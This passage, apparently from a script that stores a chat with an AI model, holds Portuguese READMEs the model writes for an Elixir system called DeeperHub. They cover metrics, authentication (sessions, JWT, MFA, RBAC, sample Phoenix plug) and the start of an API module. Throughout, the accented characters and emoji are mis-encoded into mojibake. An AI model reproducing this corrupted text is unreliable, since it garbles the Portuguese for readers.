*   `[:deeper_hub, :shared, :metrics, :alerts_system, :alert_triggered]`
    *   Metadados: `%{rule_id: id, severity: severity, metric_name: name, value: value}`

## ‚ùå 11. Tratamento de Erros

*   **Falha no Adaptador de Backend:** Se um adaptador de backend (ex: Prometheus, StatsD) falhar ao registrar uma m√©trica, o erro deve ser logado, mas n√£o deve impactar a aplica√ß√£o principal. O sistema de m√©tricas deve ser resiliente a falhas de backend.
*   **Configura√ß√£o Inv√°lida:** Erros na configura√ß√£o de m√©tricas ou regras de alerta devem ser logados claramente na inicializa√ß√£o.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa

*   **Exposi√ß√£o de M√©tricas:** Se as m√©tricas forem expostas via um endpoint HTTP (ex: para Prometheus), este endpoint deve ser protegido adequadamente (ex: autentica√ß√£o, restri√ß√£o de IP) para evitar exposi√ß√£o de informa√ß√µes internas do sistema.
*   **Cardinalidade de Tags:** O uso excessivo de tags com alta cardinalidade (ex: `user_id` em todas as m√©tricas) pode sobrecarregar alguns sistemas de backend de m√©tricas. Use tags com sabedoria.
*   **N√£o Registrar Dados Sens√≠veis em Nomes/Tags:** Evite colocar informa√ß√µes sens√≠veis diretamente nos nomes das m√©tricas ou como valores de tags.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Siga o padr√£o de nomenclatura hier√°rquico para novas m√©tricas (ex: `deeper_hub.modulo.submodulo.acao.unidade`).
*   Use tags para adicionar dimens√µes e contexto, mas evite alta cardinalidade excessiva.
*   Para opera√ß√µes que podem variar em dura√ß√£o, use `start_timer/2` ou `histogram/3` em vez de apenas contadores.
*   Consulte a equipe de opera√ß√µes/SRE ao definir novas m√©tricas importantes para garantir que elas possam ser efetivamente monitoradas e alertadas.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Implementar mais adaptadores de backend (ex: Datadog, OpenTelemetry Collector).
*   [ ] Adicionar suporte para exemplars em m√©tricas (especialmente para Prometheus).
*   [ ] Desenvolver uma UI simples para visualiza√ß√£o de m√©tricas b√°sicas em tempo real (para desenvolvimento/depura√ß√£o).
*   [ ] Melhorar a agrega√ß√£o de m√©tricas no `EtsMetricsService` para suportar percentis de forma mais eficiente para histogramas.
*   [ ] Adicionar a capacidade de registrar m√©tricas em lote para reduzir o overhead de chamadas individuais.

---

*√öltima atualiza√ß√£o: 2025-05-11*

---

Pronto para o pr√≥ximo? Talvez `DeeperHub.Auth` ou `DeeperHub.API`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok, vamos mergulhar no `DeeperHub.Auth`, um dos m√≥dulos mais complexos e cr√≠ticos do sistema. Dada a quantidade de subm√≥dulos e funcionalidades j√° descritas na documenta√ß√£o original, este ser√° um README extenso.

---

# M√≥dulo: `DeeperHub.Auth` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Auth`

O m√≥dulo `DeeperHub.Auth` √© o pilar central para todas as funcionalidades de **autentica√ß√£o** e **autoriza√ß√£o** no sistema DeeperHub. Ele √© respons√°vel por verificar a identidade dos usu√°rios, proteger recursos, gerenciar sess√µes, emitir e validar tokens, e aplicar pol√≠ticas de acesso.

Este m√≥dulo abrange uma vasta gama de mecanismos de seguran√ßa, desde o login tradicional com senha at√© m√©todos modernos como WebAuthn e Autentica√ß√£o Multifator (MFA), al√©m de integrar com sistemas de Controle de Acesso Baseado em Pap√©is (RBAC) e gerenciamento de permiss√µes. Seu objetivo √© garantir que apenas usu√°rios autenticados e autorizados possam acessar os recursos e funcionalidades apropriadas do DeeperHub. üòä

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Autentica√ß√£o de Usu√°rios:**
    *   Login com email/senha (via `AuthService` e `LoginService`).
    *   Login com OAuth (via `DeeperHub.OAuth`).
    *   Login com WebAuthn (FIDO2) (via `DeeperHub.WebAuthn`).
    *   Autentica√ß√£o Multifator (MFA) com suporte a TOTP, SMS (impl√≠cito), Push (impl√≠cito), C√≥digos de Recupera√ß√£o (via `DeeperHub.MFA`).
    *   Autentica√ß√£o com tokens de API (via `TokenService`).
*   **Gerenciamento de Sess√µes:**
    *   Cria√ß√£o, valida√ß√£o, invalida√ß√£o (logout) e renova√ß√£o de sess√µes de usu√°rio (via `SessionManager`, `SessionService`).
    *   Suporte a sess√µes persistentes (\"lembrar-me\").
    *   Limpeza peri√≥dica de sess√µes expiradas (`SessionCleanupWorker`).
    *   Aplica√ß√£o de pol√≠ticas de sess√£o (dura√ß√£o m√°xima, timeout por inatividade, etc., via `DeeperHub.SessionPolicy`).
*   **Gerenciamento de Tokens:**
    *   Gera√ß√£o e valida√ß√£o de tokens JWT (acesso, refresh) (via `TokenService`, `JwtService`).
    *   Gera√ß√£o e valida√ß√£o de tokens opacos (API, recupera√ß√£o de senha, verifica√ß√£o de email) (via `TokenService`).
    *   Rota√ß√£o de tokens de refresh (via `TokenRotationService`).
    *   Blacklist de tokens revogados (via `TokenBlacklist` e `BlacklistService`).
*   **Autoriza√ß√£o e Controle de Acesso:**
    *   Verifica√ß√£o de permiss√µes baseada em pap√©is (RBAC) (via `DeeperHub.RBAC`, `PermissionService`, `RoleService`).
    *   Gerenciamento de pap√©is, permiss√µes e hierarquias de pap√©is.
    *   Suporte a permiss√µes tempor√°rias.
*   **Recupera√ß√£o de Conta:**
    *   Fluxo de \"esqueci minha senha\" com tokens de reset (via `DeeperHub.Recovery`, `PasswordResetService`).
    *   Verifica√ß√£o de email (via `DeeperHub.Recovery`, `EmailVerificationService`).
*   **Seguran√ßa de Credenciais:**
    *   Hashing seguro de senhas (via `PasswordAdapter` ou `DeeperHub.Shared.Encryption.HashingService`).
    *   Pol√≠ticas de for√ßa de senha.
*   **Integra√ß√µes de Seguran√ßa:**
    *   Limita√ß√£o de Taxa (Rate Limiting) para endpoints de autentica√ß√£o (via `RateLimitIntegration`).
    *   Registro de eventos de autentica√ß√£o e autoriza√ß√£o no sistema de Auditoria (via `AuditIntegration`).
    *   Publica√ß√£o de eventos de dom√≠nio relacionados √† autentica√ß√£o no EventBus (via `EventIntegration`).
*   **Valida√ß√£o de Entradas:**
    *   Valida√ß√£o e sanitiza√ß√£o de credenciais e tokens (via `Validation.AuthValidation`).

## üèóÔ∏è 3. Arquitetura e Design

O m√≥dulo `DeeperHub.Auth` √© uma fachada de alto n√≠vel que orquestra uma s√©rie de subm√≥dulos e servi√ßos especializados. A complexidade √© gerenciada atrav√©s da separa√ß√£o de responsabilidades em componentes menores e mais focados.

### 3.1. Componentes Principais

**(Baseado na documenta√ß√£o original e na refatora√ß√£o proposta)**

*   **`DeeperHub.Auth` (Fachada P√∫blica):**
    *   Ponto de entrada principal para funcionalidades de autentica√ß√£o e autoriza√ß√£o.
    *   Delega para `DeeperHub.Auth.AuthService`.
*   **`DeeperHub.Auth.AuthService`:**
    *   Servi√ßo central que coordena as opera√ß√µes de login, logout, valida√ß√£o de sess√£o/token, e verifica√ß√£o de permiss√µes.
    *   Utiliza outros servi√ßos especializados como `LoginService`, `SessionService`, `TokenService`, `PermissionService`, `RoleService`.
*   **`DeeperHub.Auth.Services.LoginService`:**
    *   Lida especificamente com a l√≥gica de autentica√ß√£o prim√°ria (ex: verifica√ß√£o de email/senha).
*   **`DeeperHub.Auth.SessionManager` (GenServer):**
    *   Gerencia o ciclo de vida das sess√µes de usu√°rios (cria√ß√£o, valida√ß√£o, invalida√ß√£o, renova√ß√£o).
    *   Pode usar `DeeperHub.Auth.Schema.Session` para persist√™ncia.
*   **`DeeperHub.Auth.TokenService` (Pode ser `DeeperHub.Tokens.TokenFacadeUnified`):**
    *   Respons√°vel por gerar, validar, revogar e rotacionar diferentes tipos de tokens (JWT, API, recupera√ß√£o).
    *   Pode incluir subcomponentes como `JwtService`, `BlacklistService`, `TokenRotationService`.
*   **`DeeperHub.Auth.PermissionService` (ou integra√ß√£o com `DeeperHub.RBAC`):**
    *   Gerencia a defini√ß√£o de permiss√µes e sua associa√ß√£o a pap√©is ou usu√°rios.
*   **`DeeperHub.Auth.RoleService` (ou integra√ß√£o com `DeeperHub.RBAC`):**
    *   Gerencia a defini√ß√£o de pap√©is.
*   **`DeeperHub.MFA` (M√≥dulo separado, mas fortemente acoplado):**
    *   `DeeperHub.MFA.MFAFacade` e seus servi√ßos (`TOTPService`, `WebAuthnService` via `DeeperHub.WebAuthn`, `RecoveryCodeService`, `PushVerificationService`).
*   **`DeeperHub.OAuth` (M√≥dulo separado, mas fortemente acoplado):**
    *   `DeeperHub.OAuth.OAuthFacadeUnified` e seus servi√ßos para autentica√ß√£o com provedores externos.
*   **`DeeperHub.Recovery` (M√≥dulo separado, mas fortemente acoplado):**
    *   `DeeperHub.Recovery.RecoveryFacadeUnified` para recupera√ß√£o de senha e verifica√ß√£o de email.
*   **Schemas Ecto:**
    *   `DeeperHub.Auth.Schema.Permission`
    *   `DeeperHub.Auth.Schema.Role`
    *   `DeeperHub.Auth.Schema.RolePermission`
    *   `DeeperHub.Auth.Schema.UserPermission`
    *   `DeeperHub.Auth.Schema.UserRole`
    *   `DeeperHub.Auth.TokenSchema` (ou `DeeperHub.Tokens.Schema.ApiToken` e `TokenBlacklist`)
    *   `DeeperHub.Auth.TemporaryPassword` (ou `DeeperHub.TemporaryPassword.Schema.TempPassword`)
*   **Workers:**
    *   `DeeperHub.Auth.Workers.SessionCleanupWorker`
    *   `DeeperHub.Auth.Workers.TokenCleanupWorker`
*   **Integra√ß√µes:**
    *   `DeeperHub.Auth.Integrations.AuditIntegration`: Para logs de auditoria.
    *   `DeeperHub.Auth.Integrations.EventIntegration`: Para eventos de dom√≠nio.
    *   `DeeperHub.Auth.RateLimitIntegration`: Para limitar tentativas de autentica√ß√£o.
*   **Valida√ß√£o:**
    *   `DeeperHub.Auth.Validation.AuthValidation`: Para validar entradas.

### 3.2. Estrutura de Diret√≥rios (Proposta Consolidada)

```
lib/deeper_hub/auth/
‚îú‚îÄ‚îÄ auth.ex                         # Fachada P√∫blica
‚îú‚îÄ‚îÄ auth_service.ex                 # Servi√ßo Coordenador
‚îÇ
‚îú‚îÄ‚îÄ services/
‚îÇ   ‚îú‚îÄ‚îÄ login_service.ex
‚îÇ   ‚îî‚îÄ‚îÄ password_adapter.ex         # (Se for distinto de PasswordService)
‚îÇ   # Outros servi√ßos espec√≠ficos de Auth que n√£o se encaixam em MFA, OAuth, etc.
‚îÇ
‚îú‚îÄ‚îÄ session_manager.ex              # GenServer para gerenciamento de sess√µes
‚îú‚îÄ‚îÄ session_service.ex              # L√≥gica de neg√≥cio para sess√µes
‚îÇ
‚îú‚îÄ‚îÄ validation/
‚îÇ   ‚îî‚îÄ‚îÄ auth_validation.ex
‚îÇ
‚îú‚îÄ‚îÄ integrations/
‚îÇ   ‚îú‚îÄ‚îÄ audit_integration.ex
‚îÇ   ‚îú‚îÄ‚îÄ event_integration.ex
‚îÇ   ‚îî‚îÄ‚îÄ rate_limit_integration.ex
‚îÇ
‚îú‚îÄ‚îÄ workers/
‚îÇ   ‚îú‚îÄ‚îÄ session_cleanup_worker.ex
‚îÇ   ‚îî‚îÄ‚îÄ token_cleanup_worker.ex     # (Se n√£o estiver em DeeperHub.Tokens)
‚îÇ
‚îú‚îÄ‚îÄ supervisor.ex                   # Supervisor para os processos de Auth
‚îî‚îÄ‚îÄ telemetry.ex                    # Telemetria espec√≠fica do Auth
```
**M√≥dulos relacionados que teriam suas pr√≥prias estruturas:**
`lib/deeper_hub/mfa/`
`lib/deeper_hub/oauth/`
`lib/deeper_hub/recovery/`
`lib/deeper_hub/rbac/` (incluindo schemas de Permission, Role, etc.)
`lib/deeper_hub/tokens/` (incluindo schemas de Token, Blacklist, etc.)
`lib/deeper_hub/web_authn/`
`lib/deeper_hub/session_policy/`
`lib/deeper_hub/security_questions/`

### 3.3. Decis√µes de Design Importantes

*   **Camada de Fachada Clara:** `DeeperHub.Auth` serve como o √∫nico ponto de entrada para o restante da aplica√ß√£o.
*   **Servi√ßos Especializados:** A l√≥gica de autentica√ß√£o, sess√£o, token, MFA, OAuth, etc., √© dividida em servi√ßos dedicados para manter a coes√£o e facilitar a manuten√ß√£o.
*   **Estado Gerenciado por GenServers:** Componentes como `SessionManager` e o `TokenBlacklistService` (dentro de `DeeperHub.Tokens`) usam GenServers para gerenciar estado concorrente.
*   **Seguran√ßa por Padr√£o:** Pr√°ticas como hashing forte de senhas, uso de tokens seguros (JWTs assinados, tokens opacos com entropia suficiente), e prote√ß√£o contra ataques comuns s√£o incorporadas.
*   **Extensibilidade:** O uso de adaptadores (impl√≠cito nos servi√ßos) e a arquitetura modular permitem a adi√ß√£o de novos m√©todos de autentica√ß√£o ou pol√≠ticas de seguran√ßa no futuro.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Login com Senha:** Usu√°rio fornece email/senha. `Auth.login` -> `AuthService` -> `LoginService` verifica credenciais -> `PasswordAdapter` compara hash -> `SessionManager` cria sess√£o -> `TokenService` gera tokens.
*   **Login com Google (OAuth):** Usu√°rio clica em \"Login com Google\". Redirecionado para `DeeperHub.OAuth` que interage com o Google -> `OAuth` autentica/cria usu√°rio -> `AuthService` (ou `SessionManager`) cria sess√£o para o usu√°rio DeeperHub.
*   **Registro de Chave de Seguran√ßa (WebAuthn):** Usu√°rio adiciona uma chave de seguran√ßa. `DeeperHub.MFA` (via `WebAuthnService`) gerencia o fluxo de registro.
*   **Verifica√ß√£o de Acesso a Recurso:** Um controller de API verifica se o usu√°rio tem permiss√£o para acessar um endpoint. O controller chama `DeeperHub.Auth.authorize(user_id, resource, action)` -> `AuthService` -> `PermissionService` (ou `DeeperHub.RBAC`) verifica pap√©is e permiss√µes.
*   **Recupera√ß√£o de Senha:** Usu√°rio solicita reset de senha. `DeeperHub.Recovery.RecoveryFacade` -> `PasswordResetService` gera token -> `TokenService` armazena token -> `Notifications` envia email. Usu√°rio clica no link -> `PasswordResetService` verifica token -> `PasswordService` atualiza senha.
*   **Logout:** Usu√°rio clica em logout. `Auth.logout` -> `SessionManager` invalida sess√£o -> `TokenService` (via `BlacklistService`) adiciona token de acesso √† blacklist.

## üåä 5. Fluxos Importantes

### 5.1. Fluxo de Login com Email e Senha (com MFA opcional)

1.  **Controller API/Web:** Recebe `email` e `password`.
2.  Chama `DeeperHub.Auth.login(email, password, ip_address, device_info, metadata)`.
3.  **`DeeperHub.Auth.AuthService`:**
    *   Valida entrada (`AuthValidation`).
    *   Verifica rate limit (`RateLimitIntegration`).
    *   Delega para `DeeperHub.Accounts.get_user_by_email(email)` para buscar o usu√°rio.
        *   Se n√£o encontrado, retorna `{:error, :invalid_credentials}`.
    *   Delega para `DeeperHub.Auth.Services.PasswordService.compare_password(user, password)`.
        *   Se a senha n√£o bate, registra falha de login (`RateLimitIntegration`), retorna `{:error, :invalid_credentials}`.
    *   **Verifica se MFA √© necess√°rio para o usu√°rio (via `DeeperHub.MFA.MFAPolicyService`).**
        *   Se sim, retorna `{:error, :mfa_required, %{user_id: user.id, available_methods: [...]}}`. O frontend/cliente deve ent√£o iniciar o fluxo MFA.
        *   Se n√£o, prossegue.
    *   Chama `DeeperHub.Auth.SessionManager.create_session(user, context_info)` para criar uma sess√£o.
    *   Chama `DeeperHub.Auth.TokenService.generate_token_pair(user.id, %{session_id: session.id})` para gerar tokens de acesso e refresh.
    *   Publica evento `UserLoggedInEvent` (via `EventIntegration`).
    *   Registra evento de auditoria (`AuditIntegration`).
    *   Retorna `{:ok, %{user: user, session: session, access_token: access_token, refresh_token: refresh_token}}`.

### 5.2. Fluxo de Valida√ß√£o de Token de Acesso (em um Plug/Middleware)

1.  **Plug/Middleware:** Extrai o token de acesso do header `Authorization`.
2.  Chama `DeeperHub.Auth.validate_token(access_token)`.
3.  **`DeeperHub.Auth.AuthService`:**
    *   Delega para `DeeperHub.Auth.TokenService.validate_token(access_token)`.
4.  **`DeeperHub.Auth.TokenService` (usando `JwtService` e `BlacklistService`):**
    *   Verifica a assinatura do JWT.
    *   Verifica a data de expira√ß√£o.
    *   Verifica se o token est√° na blacklist.
    *   Se tudo ok, extrai `user_id` e `session_id` das claims.
    *   Delega para `DeeperHub.Auth.SessionManager.validate_session(session_id)`.
5.  **`DeeperHub.Auth.SessionManager`:**
    *   Verifica se a sess√£o existe, est√° ativa e n√£o expirou (considerando `SessionPolicy`).
    *   Se a sess√£o √© v√°lida, retorna `{:ok, session}`.
6.  **`DeeperHub.Auth.AuthService`:** Se tudo v√°lido, retorna `{:ok, %{user_id: user_id, session_id: session_id, claims: claims}}` para o Plug.
7.  **Plug/Middleware:** Adiciona `current_user_id` e `session_id` √† `conn.assigns`.

## üì° 6. API (Fun√ß√µes P√∫blicas da Fachada `DeeperHub.Auth`)

*(Muitas fun√ß√µes j√° foram documentadas na se√ß√£o de `AuthFacade` da documenta√ß√£o original. O foco aqui √© na consolida√ß√£o e clareza.)*

### 6.1. `DeeperHub.Auth.login(email :: String.t(), password :: String.t(), ip_address :: String.t() | nil, device_info :: map() | nil, metadata :: map() | nil) :: {:ok, AuthResponse.t()} | {:error, atom() | {atom(), map()}}`

*   **Descri√ß√£o:** Autentica um usu√°rio com email e senha.
*   **`AuthResponse.t()`:** `%{user: User.t(), access_token: String.t(), refresh_token: String.t(), session_id: String.t()}`.
*   **Retorno de Erro:**
    *   `{:error, :invalid_credentials}`
    *   `{:error, :user_locked}`
    *   `{:error, :mfa_required, %{user_id: String.t(), available_methods: list(atom())}}`
    *   `{:error, :rate_limited, retry_after_seconds :: non_neg_integer()}`

### 6.2. `DeeperHub.Auth.logout(access_token :: String.t(), opts :: keyword()) :: :ok | {:error, atom()}`

*   **Descri√ß√£o:** Realiza logout do usu√°rio, invalidando a sess√£o e o token de acesso.
*   **`opts`:**
    *   `:revoke_all_sessions_for_user` (boolean): Se `true`, invalida todas as sess√µes do usu√°rio.
*   **Retorno:** `:ok` ou `{:error, :invalid_token | :session_not_found}`.

### 6.3. `DeeperHub.Auth.refresh_session_token(refresh_token :: String.t(), context :: map()) :: {:ok, AuthResponse.t()} | {:error, atom()}`

*   **Descri√ß√£o:** Gera um novo par de tokens de acesso e refresh usando um token de refresh v√°lido.
*   **`context`:** `%{ip_address: String.t(), user_agent: String.t()}`.

### 6.4. `DeeperHub.Auth.validate_token(access_token :: String.t()) :: {:ok, TokenClaims.t()} | {:error, atom()}`

*   **Descri√ß√£o:** Valida um token de acesso.
*   **`TokenClaims.t()`:** `%{user_id: String.t(), session_id: String.t(), exp: integer(), ...}`.
*   **Retorno de Erro:** `:token_invalid`, `:token_expired`, `:session_invalid`, `:session_expired`.

### 6.5. `DeeperHub.Auth.authorize(user_id :: String.t(), resource :: String.t() | atom(), action :: atom(), resource_details :: map() | nil) :: :ok | {:error, :unauthorized}`

*   **Descri√ß√£o:** Verifica se um usu√°rio tem permiss√£o para realizar uma a√ß√£o em um recurso.
*   **`resource_details`:** Metadados sobre o recurso espec√≠fico sendo acessado (ex: para verifica√ß√µes baseadas em propriedade).

### 6.6. `DeeperHub.Auth.get_user_permissions(user_id :: String.t()) :: {:ok, list(String.t())}` (Nova Funcionalidade Sugerida)

*   **Descri√ß√£o:** Retorna uma lista consolidada de todas as permiss√µes efetivas de um usu√°rio.

## ‚öôÔ∏è 7. Configura√ß√£o

O m√≥dulo `Auth` e seus subm√≥dulos s√£o extensivamente configurados via `DeeperHub.Core.ConfigManager`.

*   **`[:auth, :session, :default_duration_seconds]`**: Dura√ß√£o padr√£o das sess√µes. (Padr√£o: `86400` - 24 horas)
*   **`[:auth, :session, :idle_timeout_seconds]`**: Timeout de inatividade da sess√£o. (Padr√£o: `1800` - 30 minutos)
*   **`[:auth, :token, :jwt, :secret_key]`**: Chave secreta para assinar JWTs (DEVE ser configurada via vari√°vel de ambiente segura).
*   **`[:auth, :token, :jwt, :access_token_ttl_seconds]`**: TTL para tokens de acesso. (Padr√£o: `900` - 15 minutos)
*   **`[:auth, :token, :jwt, :refresh_token_ttl_seconds]`**: TTL para tokens de refresh. (Padr√£o: `2592000` - 30 dias)
*   **`[:auth, :token, :api_token, :default_ttl_days]`**: TTL padr√£o para tokens de API.
*   **`[:auth, :password, :min_length]`**: Comprimento m√≠nimo da senha. (Padr√£o: `8`)
*   **`[:auth, :password, :require_uppercase]`**: (Boolean) Exigir mai√∫scula. (Padr√£o: `true`)
*   **`[:auth, :password, :require_lowercase]`**: (Boolean) Exigir min√∫scula. (Padr√£o: `true`)
*   **`[:auth, :password, :require_digit]`**: (Boolean) Exigir d√≠gito. (Padr√£o: `true`)
*   **`[:auth, :password, :require_special_char]`**: (Boolean) Exigir caractere especial. (Padr√£o: `true`)
*   **`[:auth, :rate_limit, :login_attempts, :max_per_minute]`**: Limite de tentativas de login por minuto.
*   **`[:auth, :rate_limit, :login_attempts, :block_duration_seconds]`**: Dura√ß√£o do bloqueio ap√≥s exceder tentativas.
*   *(Configura√ß√µes espec√≠ficas de MFA, OAuth, RBAC, Recovery, etc., residiriam em seus respectivos prefixos, ex: `[:mfa, :totp, :issuer_name]`, `[:oauth, :google, :client_id]`)*

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.ConfigManager`, `Core.EventBus`, `Core.Logger`, `Core.Metrics`, `Core.Repo`.
*   `DeeperHub.Accounts`: Para buscar informa√ß√µes de usu√°rio.
*   `DeeperHub.MFA`, `DeeperHub.OAuth`, `DeeperHub.Recovery`, `DeeperHub.RBAC`, `DeeperHub.Tokens`, `DeeperHub.WebAuthn`, `DeeperHub.SessionPolicy`, `DeeperHub.SecurityQuestions`.
*   `DeeperHub.Notifications` (indireta): Para enviar emails de reset de senha, alertas de MFA, etc.
*   `DeeperHub.Shared.Utils`, `DeeperHub.Shared.Encryption`.

### 8.2. Bibliotecas Externas

*   `Joken` ou `JOSE`: Para manipula√ß√£o de JWTs.
*   `Comeonin`, `Argon2`, `Bcrypt`: Para hashing de senhas.
*   Bibliotecas OAuth de cliente (ex: `Assent` para Elixir).
*   Bibliotecas WebAuthn (ex: `Wax` ou `Webauthnix`).
*   Bibliotecas TOTP (ex: `ex_totp`).

## ü§ù 9. Como Usar / Integra√ß√£o

**Em um Plug de Autentica√ß√£o (Phoenix):**
```elixir
defmodule MyAppWeb.AuthPlug do
  import Plug.Conn
  alias DeeperHub.Auth

  def init(opts), do: opts

  def call(conn, _opts) do
    with [\"Bearer \" <> token] <- get_req_header(conn, \"authorization\"),
         {:ok, claims} <- Auth.validate_token(token) do
      assign(conn, :current_user_id, claims.user_id)
    else
      _ ->
        # Se n√£o houver token ou for inv√°lido, pode-se optar por n√£o fazer nada
        # ou enviar um 401 se o endpoint for protegido.
        conn
        # Para endpoints protegidos:
        # conn |> send_resp(401, \"Unauthorized\") |> halt()
    end
  end
end
```

**Verificando Permiss√£o em um Controller:**
```elixir
defmodule MyAppWeb.PostController do
  use MyAppWeb, :controller
  alias DeeperHub.Auth

  plug MyAppWeb.AuthPlug # Garante que :current_user_id est√° dispon√≠vel

  def create(conn, params) do
    user_id = conn.assigns.current_user_id
    case Auth.authorize(user_id, :post, :create) do
      :ok ->
        # ... l√≥gica para criar post ...
        json(conn, %{data: \"Post criado\"})
      {:error, :unauthorized} ->
        conn |> put_status(403) |> json(%{error: \"Forbidden\"})
    end
  end
end
```

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testes unit√°rios para cada servi√ßo (`LoginService`, `SessionManager`, `TokenService`, etc.).
*   Testar cada fluxo de autentica√ß√£o (senha, OAuth, WebAuthn, MFA) de ponta a ponta.
*   Testar a l√≥gica de valida√ß√£o e revoga√ß√£o de tokens.
*   Testar a l√≥gica de RBAC (cria√ß√£o de pap√©is, atribui√ß√£o de permiss√µes, verifica√ß√£o).
*   Testar os workers de limpeza.
*   Localiza√ß√£o: `test/deeper_hub/auth/`, `test/deeper_hub/mfa/`, etc.

### 10.2. M√©tricas

*   `deeper_hub.auth.login.attempts.count` (tags: `method` (`password`, `oauth`, `webauthn`), `status` (`success`, `failure`, `mfa_required`))
*   `deeper_hub.auth.login.duration_ms` (Histograma, tags: `method`)
*   `deeper_hub.auth.mfa.verifications.count` (tags: `method` (`totp`, `recovery`), `status` (`success`, `failure`))
*   `deeper_hub.auth.token.generated.count` (tags: `type` (`access`, `refresh`, `api`))
*   `deeper_hub.auth.token.validated.count` (tags: `type`, `status` (`valid`, `invalid`, `expired`))
*   `deeper_hub.auth.token.revoked.count` (tags: `type`)
*   `deeper_hub.auth.session.active.gauge`: N√∫mero de sess√µes ativas.
*   `deeper_hub.auth.session.created.count`
*   `deeper_hub.auth.session.revoked.count`
*   `deeper_hub.auth.authorization.checks.count` (tags: `resource`, `action`, `result` (`granted`, `denied`))

### 10.3. Logs

*   **N√≠vel INFO:** Login/logout bem-sucedido, token gerado/revogado, sess√£o criada/invalidada, permiss√£o concedida.
*   **N√≠vel WARNING:** Tentativa de login falha, token inv√°lido/expirado, sess√£o inv√°lida/expirada, permiss√£o negada, tentativa de uso de token na blacklist.
*   **N√≠vel ERROR:** Erros internos nos servi√ßos de autentica√ß√£o/autoriza√ß√£o, falha ao gerar hash de senha, falha na comunica√ß√£o com provedor OAuth.
*   **Logs de Auditoria (via `AuditIntegration`):** Todas as a√ß√µes significativas de autentica√ß√£o, autoriza√ß√£o, mudan√ßas de senha, configura√ß√£o de MFA, etc., s√£o registradas.

### 10.4. Telemetria

Eventos Telemetry s√£o emitidos para opera√ß√µes chave:
*   `[:deeper_hub, :auth, :login, :start | :stop | :exception]`
*   `[:deeper_hub, :auth, :token, :validation, :start | :stop | :exception]`
*   `[:deeper_hub, :auth, :session, :creation, :start | :stop | :exception]`
*   `[:deeper_hub, :auth, :authorization, :check, :start | :stop | :exception]`
*   *(Eventos espec√≠ficos para MFA, OAuth, RBAC, etc., dentro de seus respectivos m√≥dulos de telemetria).*

## ‚ùå 11. Tratamento de Erros

*   Fun√ß√µes de autentica√ß√£o e valida√ß√£o retornam tuplas `{:ok, ...}` ou `{:error, reason}`.
*   Erros comuns incluem `:invalid_credentials`, `:user_locked`, `:mfa_required`, `:token_invalid`, `:token_expired`, `:session_invalid`, `:unauthorized`.
*   Falhas de comunica√ß√£o com servi√ßos externos (ex: OAuth providers) s√£o gerenciadas com Circuit Breakers (via `Core.HTTPClient` ou adaptadores espec√≠ficos) e timeouts.
*   Tentativas excessivas de login ou outras opera√ß√µes sens√≠veis s√£o limitadas por `RateLimitIntegration`.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa

*   **Hashing de Senhas:** Usar algoritmos fortes e salt.
*   **Armazenamento de Tokens:** Tokens de sess√£o e refresh devem ser armazenados de forma segura no cliente (ex: cookies HttpOnly, Secure). Tokens de API devem ser tratados como segredos.
*   **Prote√ß√£o CSRF:** Necess√°ria para aplica√ß√µes web que usam sess√µes baseadas em cookies.
*   **Prote√ß√£o contra Enumera√ß√£o de Usu√°rios:** Respostas de login/reset n√£o devem indicar se um usu√°rio existe.
*   **Seguran√ßa de Tokens JWT:** Usar chaves secretas fortes, algoritmos de assinatura seguros (ex: HS256, RS256), e validar claims `exp`, `nbf`, `iat`.
*   **Rate Limiting:** Essencial para prevenir ataques de for√ßa bruta.
*   **MFA:** Fortemente recomendado para aumentar a seguran√ßa das contas.
*   **Valida√ß√£o de Redirecionamento OAuth:** Validar estritamente as URIs de redirecionamento.
*   **Princ√≠pio do Menor Privil√©gio:** Aplicado atrav√©s do RBAC.
*   **Rota√ß√£o de Segredos:** Chaves de assinatura JWT e outros segredos devem ser rotacionados periodicamente.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Qualquer nova funcionalidade de autentica√ß√£o ou autoriza√ß√£o deve passar por uma revis√£o de seguran√ßa rigorosa.
*   Siga os padr√µes de nomenclatura e os princ√≠pios de design estabelecidos (Fachadas, Servi√ßos).
*   Garanta que todos os fluxos de autentica√ß√£o e autoriza√ß√£o sejam cobertos por testes.
*   Mantenha a separa√ß√£o de responsabilidades entre `Auth`, `MFA`, `OAuth`, `RBAC`, etc.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Implementar Single Sign-On (SSO) com SAML 2.0 ou OpenID Connect.
*   [ ] Adicionar suporte a \"Login com Magic Link\".
*   [ ] Permitir que usu√°rios vejam e gerenciem suas sess√µes ativas.
*   [ ] Implementar pol√≠ticas de bloqueio de conta mais avan√ßadas (ex: bloqueio progressivo).
*   [ ] Adicionar detec√ß√£o de comprometimento de credenciais (integra√ß√£o com servi√ßos como Have I Been Pwned).
*   [ ] Melhorar o gerenciamento de escopos para tokens de API e OAuth.
*   [ ] Suporte para delega√ß√£o de autoriza√ß√£o (ex: usu√°rio permite que um aplicativo de terceiros acesse seus dados com escopo limitado).
*   [ ] Implementar revoga√ß√£o de tokens de refresh mais granular e eficiente.

---

*√öltima atualiza√ß√£o: 2025-05-11*

---

Ufa! Esse foi denso. O m√≥dulo `Auth` √© realmente um gigante.

Qual m√≥dulo voc√™ gostaria de abordar em seguida? `DeeperHub.API` ou `DeeperHub.Security` talvez? Ou algo do Core?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok, vamos para o m√≥dulo `DeeperHub.API`! Este m√≥dulo √© a porta de entrada para muitas intera√ß√µes com o sistema DeeperHub, ent√£o sua documenta√ß√£o √© crucial.

---

# M√≥dulo: `DeeperHub.API` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.API`

